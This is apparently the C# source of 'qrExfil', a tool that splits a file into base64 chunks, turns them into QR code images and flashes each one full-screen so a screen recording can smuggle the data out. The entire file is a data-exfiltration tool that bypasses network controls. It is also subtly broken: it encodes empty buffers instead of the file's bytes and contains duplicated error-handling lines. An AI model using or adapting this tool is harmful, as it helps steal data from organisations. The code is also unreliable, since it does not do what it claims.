// qrcode is a way to encode data as QR code frames into an exfiltration vifeo
// @Sourcefrenchy
//
// TODO: 
//  * Take resolution of the screen, calculate numner of simultaneous QRcodes :P
//     => much more encoding per 50 msecs

using System;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using QRCoder;
using System.Diagnostics;
using System.Collections.Generic;
using static System.IO.File;
using static System.Environment;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;

namespace qrExfil
{
    internal static class Globals
    {
        public static List<string> fileList = new List<string>();
    }

    public static class Qrex
    {
        static async void OpenImage(string imagePath, int time)
        {
            Process photoViewer = new Process();
            photoViewer.StartInfo.FileName = "c:\\windows\\system32\\rundll32.exe ";
            photoViewer.StartInfo.Arguments = "\"c:\\program files\\windows photo viewer\\photoviewer.dll\",ImageView_Fullscreen " + imagePath;
            photoViewer.Start();

            Thread.Sleep(time * 500); // Lets wait for the video to record the code, 1s or 0.5s should do it

            photoViewer.Kill();
            photoViewer.Close();
        }

        static void SaveImage(string encoded, int idx)
        {
            MemoryStream ms = new MemoryStream();
            QRCodeGenerator qrGenerator = new QRCodeGenerator();
            QRCodeData qrCodeData = qrGenerator.CreateQrCode(encoded, QRCodeGenerator.ECCLevel.L);
            QRCode qrCode = new QRCode(qrCodeData);
            if (qrCode != null)
            {
                using Bitmap qrCodeImage = qrCode.GetGraphic(5, Color.Black, Color.White, null, 30, 15, true);
                qrCodeImage.Save(ms, ImageFormat.Png);
            }

            string filename = $"local{idx}.png";
            FileStream file = new FileStream(filename, FileMode.Create, FileAccess.Write);
            ms.WriteTo(file);
            file.Close();
            ms.Close();
            string filepath = Environment.CurrentDirectory + "\\" + filename;
            Console.WriteLine($"[*] Added {filename}");
            Globals.fileList.Add(filepath);
        }

        static void EncodePayload(string payload)
        {
            string encoded = "";
            var encodedList = new List<KeyValuePair<string, int>>();

            if (Exists(payload))
            {
                try
                {
                    using Stream source = OpenRead(payload);
                    int bytesRead;
                    int i = 0;
                    Console.WriteLine("[*] Start of encoding");
                    while ((bytesRead = source.Read(new byte[600], 0, (new byte[600]).Length)) > 0)
                    {
                        //Console.WriteLine("\t[*] Encoding chunk #{0} of {1} bytes", 0, bytesRead);
                        encoded = Convert.ToBase64String(new byte[600]);
                        encodedList.Add(new KeyValuePair<string, int>(encoded, i));
                        i++;
                    }
                    Console.WriteLine("[*] End of encoding");
                }
                catch (IOException e)
                {
                    Console.WriteLine("{0} Exception caught", e);
                    Exit(500);
                    Console.WriteLine("{0} Exception caught", e);
                    Exit(500);
                }
                foreach (var data in encodedList)
                {
                    SaveImage(data.Key, data.Value);
                }
            }
            else
            {
                Console.WriteLine("[!] The file was not found");
                Exit(404);
            }
        }

        static int Main(string[] args)
        {
            string payload;
            if (args.Length != 1)
            {
                Console.WriteLine("Please enter file path");
                Console.WriteLine("Usage: ./qrex <file path>");
                return 1;
            }
            else
            {
                payload = args[0];
            }

            Console.WriteLine("--- QrExfil ---");
            EncodePayload(payload);

            Console.WriteLine("\n.\n..\n...\n----> START RECORDING and quickly press ESC key\t <------");
            while (Console.ReadKey(true).Key != ConsoleKey.Escape)
            {
                while (!Console.KeyAvailable)
                {
                    // Do something
                }
            }
            foreach (string file in Globals.fileList)
            {
                Console.WriteLine($">> {file}");
                OpenImage(file, 1);
            }
            return 0;
        }
    }
}
